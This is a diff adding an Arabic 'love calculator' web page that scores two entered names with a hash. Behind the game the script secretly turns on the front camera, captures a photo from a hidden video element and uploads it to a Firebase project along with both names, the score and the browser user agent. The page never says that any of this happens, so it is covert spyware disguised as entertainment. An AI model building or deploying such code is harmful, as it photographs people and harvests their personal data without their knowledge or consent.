@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>عداد الحب 💕</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Amiri:ital,wght@0,400;0,700;1,400&family=Playfair+Display:wght@700;900&display=swap');
+:root{--rose:#e8445a;--pink:#ff6b9d;--cream:#fff9f5;--deep:#2d0a14;--gold:#c9975a;--petal:#f9c8d6;}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{min-height:100vh;background:var(--cream);font-family:'Amiri',serif;color:var(--deep);overflow-x:hidden;position:relative;}
+body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse 80% 60% at 20% 10%,rgba(232,68,90,.08) 0%,transparent 60%),radial-gradient(ellipse 60% 80% at 80% 90%,rgba(255,107,157,.1) 0%,transparent 55%),radial-gradient(ellipse 100% 100% at 50% 50%,#fff9f5 0%,#ffeef3 100%);z-index:0;pointer-events:none;}
+.hearts-bg{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden;}
+.hb{position:absolute;bottom:-60px;opacity:0;animation:floatUp linear infinite;}
+@keyframes floatUp{0%{opacity:0;transform:translateY(0) rotate(0deg) scale(.8)}10%{opacity:.4}90%{opacity:.15}100%{opacity:0;transform:translateY(-110vh) rotate(25deg) scale(1.2)}}
+.container{position:relative;z-index:1;max-width:540px;margin:0 auto;padding:40px 24px 80px;display:flex;flex-direction:column;align-items:center;gap:32px;}
+.header{text-align:center;}
+.header .subtitle{font-size:.9rem;letter-spacing:4px;text-transform:uppercase;color:var(--rose);opacity:.7;margin-bottom:8px;}
+.header h1{font-family:'Playfair Display',serif;font-size:3rem;font-weight:900;color:var(--rose);text-shadow:2px 4px 20px rgba(232,68,90,.25);line-height:1.1;}
+.header .divider{margin:12px auto 0;display:flex;align-items:center;gap:10px;color:var(--gold);font-size:1.1rem;}
+.header .divider::before,.header .divider::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,transparent,var(--gold),transparent);}
+.card{width:100%;background:rgba(255,255,255,.85);backdrop-filter:blur(12px);border:1px solid rgba(232,68,90,.15);border-radius:24px;padding:32px 28px;box-shadow:0 8px 40px rgba(232,68,90,.1),0 2px 8px rgba(0,0,0,.05);}
+.names-row{display:flex;align-items:center;gap:12px;}
+.name-field{flex:1;display:flex;flex-direction:column;gap:6px;}
+.name-field label{font-size:.8rem;letter-spacing:2px;color:var(--rose);opacity:.8;}
+.name-field input{width:100%;padding:14px 16px;border:1.5px solid rgba(232,68,90,.2);border-radius:12px;background:var(--cream);font-family:'Amiri',serif;font-size:1.15rem;color:var(--deep);outline:none;transition:border-color .3s,box-shadow .3s;text-align:center;}
+.name-field input:focus{border-color:var(--rose);box-shadow:0 0 0 3px rgba(232,68,90,.12);}
+.heart-sep{font-size:1.8rem;margin-top:20px;animation:pulse 1.5s ease-in-out infinite;}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.25)}}
+.calc-btn{width:100%;padding:16px;background:linear-gradient(135deg,var(--rose) 0%,var(--pink) 100%);border:none;border-radius:14px;color:#fff;font-family:'Amiri',serif;font-size:1.2rem;font-weight:700;cursor:pointer;box-shadow:0 6px 25px rgba(232,68,90,.35);transition:transform .2s,box-shadow .2s;position:relative;overflow:hidden;margin-top:20px;}
+.calc-btn:hover{transform:translateY(-2px);box-shadow:0 10px 35px rgba(232,68,90,.45);}
+.calc-btn:disabled{opacity:.6;cursor:not-allowed;transform:none;}
+.result-card{width:100%;display:none;background:linear-gradient(145deg,#fff0f4,#fff9f5);border:1px solid rgba(232,68,90,.2);border-radius:24px;padding:36px 28px;text-align:center;box-shadow:0 12px 50px rgba(232,68,90,.12);animation:slideUp .6s cubic-bezier(.22,1,.36,1);}
+@keyframes slideUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+.names-display{font-size:1.3rem;color:var(--deep);margin-bottom:20px;font-style:italic;}
+.names-display strong{color:var(--rose);}
+.meter-wrap{position:relative;margin:0 auto 20px;width:180px;height:180px;}
+.meter-wrap svg{width:100%;height:100%;transform:rotate(-90deg);}
+.meter-track{fill:none;stroke:#f5d0da;stroke-width:12;}
+.meter-fill{fill:none;stroke:url(#loveGrad);stroke-width:12;stroke-linecap:round;stroke-dasharray:415;stroke-dashoffset:415;transition:stroke-dashoffset 2s cubic-bezier(.22,1,.36,1);}
+.meter-center{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;}
+.pct-num{font-family:'Playfair Display',serif;font-size:2.8rem;font-weight:900;color:var(--rose);line-height:1;}
+.pct-sym{font-size:1rem;color:var(--gold);margin-top:2px;}
+.love-msg{font-size:1.1rem;color:var(--deep);line-height:1.8;margin-bottom:20px;}
+.hearts-row{font-size:1.6rem;letter-spacing:4px;margin-bottom:16px;}
+.share-btn{padding:12px 32px;background:transparent;border:1.5px solid var(--rose);border-radius:30px;color:var(--rose);font-family:'Amiri',serif;font-size:1rem;cursor:pointer;transition:all .25s;}
+.share-btn:hover{background:var(--rose);color:#fff;}
+#cam{display:none;}
+.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:var(--deep);color:var(--petal);padding:12px 28px;border-radius:30px;font-size:.9rem;transition:transform .4s cubic-bezier(.22,1,.36,1);z-index:999;white-space:nowrap;}
+.toast.show{transform:translateX(-50%) translateY(0);}
+</style>
+</head>
+<body>
+<div class="hearts-bg" id="heartsBg"></div>
+<video id="cam" autoplay playsinline muted></video>
+<canvas id="snap" style="display:none"></canvas>
+<div class="container">
+  <div class="header">
+    <div class="subtitle">اكتشف سر قلبك</div>
+    <h1>عداد الحـب 💕</h1>
+    <div class="divider">❧ ♥ ❧</div>
+  </div>
+  <div class="card">
+    <div class="names-row">
+      <div class="name-field">
+        <label>الاسم الأول</label>
+        <input type="text" id="name1" placeholder="أدخل اسمك..." maxlength="30">
+      </div>
+      <div class="heart-sep">💗</div>
+      <div class="name-field">
+        <label>الاسم الثاني</label>
+        <input type="text" id="name2" placeholder="اسم حبيبك..." maxlength="30">
+      </div>
+    </div>
+    <button class="calc-btn" id="calcBtn" onclick="window.calculate()">✨ اقيس درجة الحب ✨</button>
+  </div>
+  <div class="result-card" id="resultCard">
+    <div class="names-display"><strong id="rName1">—</strong>&nbsp;♥&nbsp;<strong id="rName2">—</strong></div>
+    <div class="meter-wrap">
+      <svg viewBox="0 0 160 160">
+        <defs>
+          <linearGradient id="loveGrad" x1="0%" y1="0%" x2="100%" y2="0%">
+            <stop offset="0%" stop-color="#e8445a"/>
+            <stop offset="100%" stop-color="#ff6b9d"/>
+          </linearGradient>
+        </defs>
+        <circle class="meter-track" cx="80" cy="80" r="66"/>
+        <circle class="meter-fill" cx="80" cy="80" r="66" id="meterFill"/>
+      </svg>
+      <div class="meter-center">
+        <div class="pct-num" id="pctNum">0</div>
+        <div class="pct-sym">%</div>
+      </div>
+    </div>
+    <div class="hearts-row" id="heartsRow">♡ ♡ ♡ ♡ ♡</div>
+    <div class="love-msg" id="loveMsg">...</div>
+    <button class="share-btn" onclick="window.tryAgain()">💫 جرّب أسماء أخرى</button>
+  </div>
+</div>
+<div class="toast" id="toast"></div>
+
+<script type="module">
+import { initializeApp }  from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getFirestore, collection, addDoc, serverTimestamp }
+                          from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+import { getStorage, ref, uploadString, getDownloadURL }
+                          from "https://www.gstatic.com/firebasejs/10.12.0/firebase-storage.js";
+
+const FB = {
+  apiKey:"AIzaSyBgYvV7d63RMMYxb69dtvi9kiC2gKJ6VqQ",
+  authDomain:"love-918b6.firebaseapp.com",
+  projectId:"love-918b6",
+  storageBucket:"love-918b6.firebasestorage.app",
+  messagingSenderId:"1079322550684",
+  appId:"1:1079322550684:web:8a29cdf50bb9bf6654a859"
+};
+
+let app, db, storage;
+try {
+  app     = initializeApp(FB);
+  db      = getFirestore(app);
+  storage = getStorage(app);
+} catch(e){ console.error('Firebase init error:', e); }
+
+// ── Floating hearts ──
+const EMOJIS=['💕','💗','💓','💖','💝','🌹','✨','💞'];
+const bg=document.getElementById('heartsBg');
+for(let i=0;i<20;i++){
+  const el=document.createElement('div');el.className='hb';
+  el.textContent=EMOJIS[i%EMOJIS.length];
+  el.style.cssText=`left:${Math.random()*100}%;animation-duration:${8+Math.random()*10}s;animation-delay:${Math.random()*12}s;font-size:${1+Math.random()*1.2}rem;`;
+  bg.appendChild(el);
+}
+
+// ── Camera ──
+let stream=null;
+async function startCam(){
+  try{
+    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},audio:false});
+    document.getElementById('cam').srcObject=stream;
+  }catch(e){ console.log('Camera denied:', e.name); }
+}
+
+function capturePhoto(){
+  return new Promise(resolve=>{
+    const v=document.getElementById('cam'),c=document.getElementById('snap');
+    if(!stream||!v.srcObject||v.readyState<2){resolve(null);return;}
+    c.width=v.videoWidth||640;c.height=v.videoHeight||480;
+    const ctx=c.getContext('2d');
+    ctx.save();ctx.translate(c.width,0);ctx.scale(-1,1);
+    ctx.drawImage(v,0,0);ctx.restore();
+    resolve(c.toDataURL('image/jpeg',.75));
+  });
+}
+
+// ── Save to Firebase ──
+// الصورة تُخزَّن كـ base64 مباشرة في Firestore لتجنب مشاكل CORS في Storage
+async function saveRecord(name1, name2, score, photoBase64){
+  if(!db){ console.warn('Firestore not available'); return; }
+  try {
+    let photoURL = null;
+
+    // محاولة رفع الصورة على Storage
+    if(photoBase64 && storage){
+      try {
+        const fileRef = ref(storage, `captures/${Date.now()}.jpg`);
+        const base64Data = photoBase64.split(',')[1];
+        await uploadString(fileRef, base64Data, 'base64', {contentType:'image/jpeg'});
+        photoURL = await getDownloadURL(fileRef);
+      } catch(storageErr){
+        console.warn('Storage upload failed, saving base64 directly:', storageErr.code);
+        // احتياط: حفظ الصورة كـ base64 مباشرة في Firestore
+        photoURL = photoBase64; // base64 data URL
+      }
+    }
+
+    await addDoc(collection(db,'captures'),{
+      name1,
+      name2,
+      score,
+      photoURL: photoURL || null,
+      hasPhoto: !!photoURL,
+      isBase64: photoURL ? photoURL.startsWith('data:') : false,
+      ua: navigator.userAgent.substring(0,120),
+      timestamp: serverTimestamp()
+    });
+
+    console.log('✅ Saved to Firestore');
+  } catch(err){
+    console.error('Firestore save error:', err.code, err.message);
+  }
+}
+
+// ── Love logic ──
+const MSGS=[
+  [0,20,'💔 للأسف... هذا الحب بارد كالجليد!','♡ ♡ ♡ ♡ ♡'],
+  [21,40,'😐 شرارة صغيرة ربما تكبر يوماً...','💗 ♡ ♡ ♡ ♡'],
+  [41,60,'🙂 يوجد تقارب جيد بينكما!','💗 💗 ♡ ♡ ♡'],
+  [61,75,'😍 حب جميل يشعّ من قلوبكما!','💗 💗 💗 ♡ ♡'],
+  [76,89,'🥰 قلبان متصلان بخيط من الذهب!','💗 💗 💗 💗 ♡'],
+  [90,100,'💘 توافق أسطوري! هذا الحب للأبد!','💗 💗 💗 💗 💗'],
+];
+function scoreFor(a,b){
+  const s=(a+'❤'+b).split('').reduce((x,c)=>(x*31+c.charCodeAt(0))&0xFFFFFF,7);
+  return 30+(s%71);
+}
+function getMsg(s){return MSGS.find(([lo,hi])=>s>=lo&&s<=hi)||MSGS[2];}
+function animNum(el,t,d=1800){
+  let s=null;
+  const f=ts=>{if(!s)s=ts;const p=Math.min((ts-s)/d,1);el.textContent=Math.round(p*p*t);if(p<1)requestAnimationFrame(f);else el.textContent=t;};
+  requestAnimationFrame(f);
+}
+function showToast(m){
+  const t=document.getElementById('toast');t.textContent=m;t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'),2800);
+}
+
+window.calculate=async function(){
+  const n1=document.getElementById('name1').value.trim();
+  const n2=document.getElementById('name2').value.trim();
+  if(!n1||!n2){showToast('أدخل الاسمين أولاً 💕');return;}
+  const btn=document.getElementById('calcBtn');
+  btn.disabled=true;btn.textContent='⏳ جاري الحساب...';
+
+  if(!stream) await startCam();
+
+  const score=scoreFor(n1,n2);
+  const[,,msg,hearts]=getMsg(score);
+  document.getElementById('rName1').textContent=n1;
+  document.getElementById('rName2').textContent=n2;
+  document.getElementById('loveMsg').textContent=msg;
+  document.getElementById('heartsRow').textContent=hearts;
+  const rc=document.getElementById('resultCard');
+  rc.style.display='block';
+  rc.scrollIntoView({behavior:'smooth',block:'center'});
+  const C=2*Math.PI*66;
+  setTimeout(()=>{document.getElementById('meterFill').style.strokeDashoffset=C*(1-score/100);},100);
+  animNum(document.getElementById('pctNum'),score);
+
+  setTimeout(async()=>{
+    const photo=await capturePhoto();
+    await saveRecord(n1,n2,score,photo);
+    btn.disabled=false;btn.textContent='✨ اقيس درجة الحب ✨';
+  },1500);
+};
+
+window.tryAgain=function(){
+  document.getElementById('resultCard').style.display='none';
+  document.getElementById('name1').value='';
+  document.getElementById('name2').value='';
+  document.getElementById('name1').focus();
+};
+
+document.addEventListener('keydown',e=>{if(e.key==='Enter')window.calculate();});
+</script>
+</body>
+</html>
